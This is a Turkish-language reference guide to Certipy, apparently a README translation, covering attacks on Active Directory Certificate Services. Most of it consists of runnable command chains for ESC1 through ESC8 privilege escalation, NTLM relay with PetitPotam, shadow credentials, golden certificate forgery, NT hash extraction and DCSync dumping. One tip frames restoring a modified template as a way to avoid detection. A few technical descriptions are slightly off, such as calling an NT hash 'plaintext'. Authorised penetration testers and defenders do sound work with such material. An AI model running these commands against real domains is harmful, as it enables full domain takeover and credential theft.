# 🏛️ Certipy - Kapsamlı Başvuru Kılavuzu

[🇺🇸 English Version](../README.md)

```
   ██████╗███████╗██████╗ ████████╗██╗██████╗ ██╗   ██╗
  ██╔════╝██╔════╝██╔══██╗╚══██╔══╝██║██╔══██╗╚██╗ ██╔╝
  ██║     █████╗  ██████╔╝   ██║   ██║██████╔╝ ╚████╔╝ 
  ██║     ██╔══╝  ██╔══██╗   ██║   ██║██╔═══╝   ╚██╔╝  
  ╚██████╗███████╗██║  ██║   ██║   ██║██║        ██║   
   ╚═════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝        ╚═╝   
       Active Directory Certificate Services (AD CS) Abuse
```

<p align="center">
  <img src="https://img.shields.io/badge/Certipy-AD_CS_Abuse-blue?style=for-the-badge" alt="Certipy">
  <img src="https://img.shields.io/badge/ESC1_to_ESC15-Vulnerabilities-red?style=for-the-badge" alt="ESC1-ESC15">
  <img src="https://img.shields.io/badge/PKINIT-Kerberos_Auth-orange?style=for-the-badge" alt="PKINIT">
  <img src="https://img.shields.io/badge/Active_Directory-Privilege_Escalation-green?style=for-the-badge" alt="AD PrivEsc">
</p>

<p align="center">
  <b>🔑 Active Directory Sertifika Hizmetleri (AD CS) yapılandırma hatalarını keşfetmek ve istismar etmek için geliştirilmiş kapsamlı araç</b>
</p>

---

## 📋 İçindekiler

- [Giriş](#-giriş)
- [Neden AD CS İstismarı?](#-neden-ad-cs-i̇stismarı)
- [Kurulum](#-kurulum)
- [Certipy Alt Komutlarına Genel Bakış](#-certipy-alt-komutlarına-genel-bakış)
- [Numaralandırma ve Keşif (`find`)](#-numaralandırma-ve-keşif-find)
- [ESC Zafiyet Matrisi](#-esc-zafiyet-matrisi)
  - [ESC1: Talep Sahibinin Alternatif Konu Adı (SAN) Belirlemesi](#esc1-talep-sahibinin-alternatif-konu-adı-san-belirlemesi)
  - [ESC2: Her Amaca Uygun EKU (Any Purpose) veya SubCA](#esc2-her-amaca-uygun-eku-any-purpose-veya-subca)
  - [ESC3: Sertifika Talep Temsilcisi (Certificate Request Agent)](#esc3-sertifika-talep-temsilcisi-certificate-request-agent)
  - [ESC4: Zafiyetli Şablon Erişim Hakları (ACL)](#esc4-zafiyetli-şablon-erişim-hakları-acl)
  - [ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 Bayrağının Açık Olması](#esc6-editf_attributesubjectaltname2-bayrağının-açık-olması)
  - [ESC7: Zafiyetli Sertifika Otoritesi (CA) İzinleri](#esc7-zafiyetli-sertifika-otoritesi-ca-i̇zinleri)
  - [ESC8: HTTP Web Kaydı Arayüzüne NTLM Relay](#esc8-http-web-kaydı-arayüzüne-ntlm-relay)
  - [ESC9 ve ESC10: Güçlü Sertifika Eşleme Kusurları](#esc9-ve-esc10-güçlü-sertifika-eşleme-kusurları)
- [Gölge Kimlik Bilgileri (`shadow`)](#-gölge-kimlik-bilgileri-shadow)
- [Altın Sertifikalar (`forge`)](#-altın-sertifikalar-forge)
- [PFX ile Kimlik Doğrulama (`auth`)](#-pfx-ile-kimlik-doğrulama-auth)
- [Gerçek Dünya Saldırı İş Akışları](#-gerçek-dünya-saldırı-i̇ş-akışları)
- [Hızlı Referans Tablosu](#-hızlı-referans-tablosu)
- [İpuçları ve En İyi Pratikler](#-i̇puçları-ve-en-i̇yi-pratikler)
- [Yasal Uyarı](#-yasal-uyarı)
- [Kaynaklar](#-kaynaklar)

---

## 🎯 Giriş

**Certipy** (Oliver Lyak tarafından geliştirilmiştir), Active Directory Sertifika Hizmetlerini (**AD CS**) numaralandırmak ve istismar etmek için kullanılan sektör standardı Python aracıdır. AD CS, kurumsal Active Directory ortamlarında akıllı kart ile oturum açma, VPN kimlik doğrulaması, S/MIME ve dahili TLS şifrelemesi gibi işlemleri yürüten Microsoft Açık Anahtar Altyapısıdır (PKI).

Sertifika şablonlarındaki hatalı yapılandırmalar yetkisiz standart etki alanı kullanıcılarının doğrudan Domain Administrator veya Domain Controller adına sertifika üretmesine olanak sağladığından; AD CS saldırıları modern iç ağ sızma testlerindeki en etkili yetki yükseltme vektörlerinden biridir.

---

## ⚖️ Neden AD CS İstismarı?

- ⚡ **Anında Domain Administrator Yetkisi:** Hatalı yapılandırılmış tek bir şablon saniyeler içinde tüm etki alanını ele geçirmenizi sağlar.
- 🔑 **Gizli ve Kalıcı:** Elde edilen sertifikalar veya sahte üretilen Altın Sertifikalar (Golden Certificates), kullanıcının parolası değişse bile geçerliliğini yıllarca koruyabilir.
- 🔄 **PKINIT ile NT Hash Elde Etme:** Certipy, üretilen `.pfx` sertifikalarını Kerberos PKINIT protokolü üzerinden doğrulayarak hedef kullanıcının düz metin NT hash değerini KDC üzerinden doğrudan çeker.

---

## 📥 Kurulum

### pipx ile Kurulum (Önerilen)

```bash
pipx install certipy-ad
```

### GitHub Deposundan Kurulum

```bash
git clone https://github.com/ly4k/Certipy.git
cd Certipy
pip install .
```

### Kurulum Doğrulama

```bash
certipy -h
```

---

## 🧭 Certipy Alt Komutlarına Genel Bakış

| Alt Komut | İşlev |
|-----------|-------|
| `find` | CA'leri ve şablonları numaralandırır, ESC zafiyetlerini tespit eder |
| `req` | Zafiyetli şablonlardan sertifika talep eder |
| `auth` | `.pfx` sertifikalarıyla kimlik doğrulaması yaparak TGT ve NT hash elde eder |
| `ca` | CA yapılandırma ayarlarını görüntüler ve değiştirir |
| `template` | Sertifika şablonu ayarlarını düzenler (ESC4 için kullanılır) |
| `account` | Bilgisayar hesaplarını yönetir (MachineAccountQuota) |
| `shadow` | Gölge kimlik bilgilerini (`msDS-KeyCredentialLink`) istismar eder |
| `forge` | Çalınan CA özel anahtarı ile Altın Sertifika (Golden Certificate) üretir |

---

## 🔍 Numaralandırma ve Keşif (`find`)

Etki alanındaki Sertifika Otoritelerini (CA) ve zafiyetli şablonları tespit ederek başlayın:

```bash
# Standart kullanıcı bilgileriyle tüm CA ve şablonları listeleyin
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1

# Yalnızca zafiyetli olan şablonları ekrana yazdırın
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1 -vulnerable -stdout

# BloodHound analizi için JSON formatında çıktı alın
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1 -bloodhound
```

---

## 💥 ESC Zafiyet Matrisi

### ESC1: Talep Sahibinin Alternatif Konu Adı (SAN) Belirlemesi

**Koşullar:**
- Düşük yetkili kullanıcıların sertifika talep hakkı (`Client Authentication` EKU) vardır.
- Şablon `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` bayrağını içerir (talep sahibinin Domain Admin gibi farklı bir kullanıcının UPN'ini belirtmesine izin verir).

**İstismar:**
```bash
# 1. Domain Administrator adına sertifika talep edin
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'VulnerableTemplate' \
  -upn 'administrator@corp.local' \
  -dc-ip 10.10.10.1

# 2. Üretilen administrator.pfx ile PKINIT üzerinden oturum açın
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```
*Çıktı, Administrator kullanıcısının TGT biletini ve NT Hash değerini döner!*

---

### ESC2: Her Amaca Uygun EKU (Any Purpose) veya SubCA

**Koşullar:**
- Şablon `Any Purpose` EKU içerir veya hiçbir EKU tanımlanmamıştır.
- İstemci kimlik doğrulaması dahil her amaç için kullanılabilir.

**İstismar:**
ESC1 gibi doğrudan veya bir kayıt temsilcisi (enrollment agent) sertifikası almak için ESC3 ile zincirlenerek kullanılır.

---

### ESC3: Sertifika Talep Temsilcisi (Certificate Request Agent)

**Koşullar:**
- Şablon `Certificate Request Agent` EKU'suna sahiptir.
- Başka bir kullanıcı adına ikincil bir şablondan sertifika talep edilmesine izin verir.

**İstismar:**
```bash
# 1. Kayıt Temsilcisi sertifikası talep edin
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'AgentTemplate' -dc-ip 10.10.10.1

# 2. Bu temsilci sertifikasını kullanarak Administrator adına talep oluşturun
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'UserTemplate' \
  -on-behalf-of 'CORP\administrator' \
  -pfx john.pfx -dc-ip 10.10.10.1

# 3. Elde edilen Administrator PFX dosyası ile kimlik doğrulayın
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

---

### ESC4: Zafiyetli Şablon Erişim Hakları (ACL)

**Koşullar:**
- Standart bir kullanıcının şablon üzerinde `WriteOwner`, `WriteDacl` veya `WriteProperty` izinleri vardır.

**İstismar:**
```bash
# 1. Şablon yapılandırmasını ESC1 zafiyetine açık hale getirin (eskiyi yedekleyin)
certipy template -u 'john.doe@corp.local' -p 'P@ssword123' \
  -template 'TargetTemplate' \
  -save-old \
  -dc-ip 10.10.10.1

# 2. ESC1 yöntemiyle Administrator sertifikası alın
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'TargetTemplate' \
  -upn 'administrator@corp.local' -dc-ip 10.10.10.1

# 3. Tespit edilmemek için şablonun orijinal ayarlarını geri yükleyin
certipy template -u 'john.doe@corp.local' -p 'P@ssword123' \
  -template 'TargetTemplate' \
  -configuration TargetTemplate.json -dc-ip 10.10.10.1
```

---

### ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 Bayrağının Açık Olması

**Koşullar:**
- CA üzerinde `EDITF_ATTRIBUTESUBJECTALTNAME2` bayrağı etkindir. Bu bayrak, şablon izin vermese bile talep sahibinin rastgele SAN belirtmesine olanak tanır!

**İstismar:**
```bash
# Client Auth izni veren standart herhangi bir şablon (örn: 'User') ile Administrator sertifikası alın
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'User' \
  -upn 'administrator@corp.local' -dc-ip 10.10.10.1
```

---

### ESC7: Zafiyetli Sertifika Otoritesi (CA) İzinleri

**Koşullar:**
- Kullanıcı CA nesnesi üzerinde `ManageCA` veya `ManageCertificates` yetkisine sahiptir.

**İstismar:**
```bash
# 1. Kendinizi CA Yöneticisi (Officer) olarak ekleyin
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -add-officer 'john.doe' -dc-ip 10.10.10.1

# 2. CA üzerinde zafiyetli SubCA şablonunu etkinleştirin
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -enable-template 'SubCA' -dc-ip 10.10.10.1

# 3. Daha önce reddedilen sertifika talebini onaylayıp indirin
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -issue-request <REQUEST_ID> -dc-ip 10.10.10.1
```

---

### ESC8: HTTP Web Kaydı Arayüzüne NTLM Relay

**Koşullar:**
- CA sunucusunda Web Kayıt arayüzü (`/certsrv/`) açıktır ve NTLM kimlik doğrulamasında EPA (Genişletilmiş Koruma) ve HTTPS zorunluluğu yoktur.

**Saldırı Akışı:**
1. `ntlmrelayx` aracını Web Kayıt sayfasına hedefleyecek şekilde başlatın:
   ```bash
   impacket-ntlmrelayx -t http://10.10.10.50/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
   ```
2. PetitPotam veya PrinterBug ile etki alanı denetleyicisini (DC) sahte kimlik doğrulamasına zorlayın:
   ```bash
   python3 petitpotam.py 192.168.1.100 10.10.10.1
   ```
3. `ntlmrelayx`, DC'nin kimlik doğrulamasını aktarır, bir makine sertifikası alır ve base64 `.pfx` üretir.
4. Elde edilen sertifika ile DC adına kimlik doğrulaması yapın:
   ```bash
   certipy auth -pfx dc01.pfx -dc-ip 10.10.10.1
   ```
5. DC NT hash değeri ile `secretsdump.py` üzerinden tam DCSync dökümü alın.

---

## 👥 Gölge Kimlik Bilgileri (`shadow`)

Bir hesap başka bir hesabın `msDS-KeyCredentialLink` özniteliği üzerinde yazma hakkına sahipse:

```bash
# Hedef hesaba anahtar kimlik bilgisi yazar, PKINIT ile doğrular ve NT hash değerini çeker
certipy shadow auto -u 'john.doe@corp.local' -p 'P@ssword123' \
  -account 'TARGET_USER' \
  -dc-ip 10.10.10.1
```

---

## 👑 Altın Sertifikalar (`forge`)

CA sunucusu ele geçirilip özel anahtarı dışa aktarıldığında:

```bash
# CA ile iletişim kurmadan herhangi bir kullanıcı adına geçerli Altın Sertifika üretin
certipy forge -ca-pfx ca_private.pfx \
  -upn 'administrator@corp.local' \
  -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'

# Sahte sertifika ile oturum açın
certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.10.1
```

---

## 🔑 PFX ile Kimlik Doğrulama (`auth`)

```bash
# PKINIT üzerinden TGT ve NT hash elde edin
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# TGT biletini Kerberos kullanımı için ccache dosyasına kaydedin
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1 -ldap-shell
```

---

## 🎬 Gerçek Dünya Saldırı İş Akışları

### 3 Komutta Tam ESC1 Etki Alanı Ele Geçirme

```bash
# Adım 1: ESC1 şablonunu keşfedin
certipy find -u 'alice@domain.local' -p 'Summer2026!' -dc-ip 10.10.10.1 -vulnerable -stdout

# Adım 2: Administrator adına sertifika talep edin
certipy req -u 'alice@domain.local' -p 'Summer2026!' \
  -ca 'Domain-CA' \
  -template 'SmartCardUser' \
  -upn 'administrator@domain.local' \
  -dc-ip 10.10.10.1

# Adım 3: NT hash değerini çekin
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Adım 4: Tam DCSync hash dökümü
impacket-secretsdump -hashes :<ELDE_EDILEN_NT_HASH> 'domain.local/administrator@10.10.10.1'
```

---

## 📊 Hızlı Referans Tablosu

| Görev | Komut |
|-------|-------|
| **AD CS Numaralandırma** | `certipy find -u u@d -p p -dc-ip <IP> -vulnerable -stdout` |
| **Sertifika Talebi (ESC1)** | `certipy req -u u@d -p p -ca <CA> -template <T> -upn admin@d -dc-ip <IP>` |
| **PFX ile Kimlik Doğrulama** | `certipy auth -pfx <dosya>.pfx -dc-ip <IP>` |
| **Şablon Değiştirme (ESC4)**| `certipy template -u u@d -p p -template <T> -save-old -dc-ip <IP>` |
| **Gölge Kimlik Bilgileri** | `certipy shadow auto -u u@d -p p -account <TARGET> -dc-ip <IP>` |
| **CA İzinlerini Yönetme** | `certipy ca -u u@d -p p -ca <CA> -add-officer <u> -dc-ip <IP>` |
| **Altın Sertifika Üretme** | `certipy forge -ca-pfx ca.pfx -upn admin@d -subject <DN>` |

---

## 💡 İpuçları ve En İyi Pratikler

1. **Etki Alanı Denetleyicisi ile Saat Eşitlemesi:**
   Kerberos PKINIT, yerel sistem saatinizin DC ile maksimum 5 dakika fark içinde olmasını şart koşar. Senkronizasyon için:
   ```bash
   sudo rdate -n 10.10.10.1
   # veya
   sudo ntpdate 10.10.10.1
   ```
2. **KDC_ERR_PADATA_TYPE_NOSUPP Hatası:**
   Eğer `certipy auth` bu hatayı verirse, Domain Controller üzerinde PKINIT için geçerli bir makine sertifikası bulunmuyor demektir. Bu durumda LDAP veya SChannel üzerinden doğrulama deneyin.
3. **ESC4 Değişikliklerini Mutlaka Geri Alın:**
   Şablon ayarlarını değiştirdikten sonra test bitiminde mutlaka oluşturulan yedek yapılandırmayı (`-configuration <DOSYA>.json`) geri yükleyin.

---

## ⚠️ Yasal Uyarı

> **ÖNEMLİ:** Active Directory Sertifika Hizmetleri istismarı etki alanı genelinde kritik ve geri dönülemez yetkiler sağlar. Certipy yalnızca yazılı izin alınmış penetrasyon testlerinde ve Red Team tatbikatlarında kullanılmalıdır.

---

## 📚 Kaynaklar

- [Certipy Resmi GitHub Deposu](https://github.com/ly4k/Certipy)
- [Certified Pre-Owned Teknik Raporu (SpecterOps)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [AD CS Saldırı Yolları ve Savunma (Oliver Lyak)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
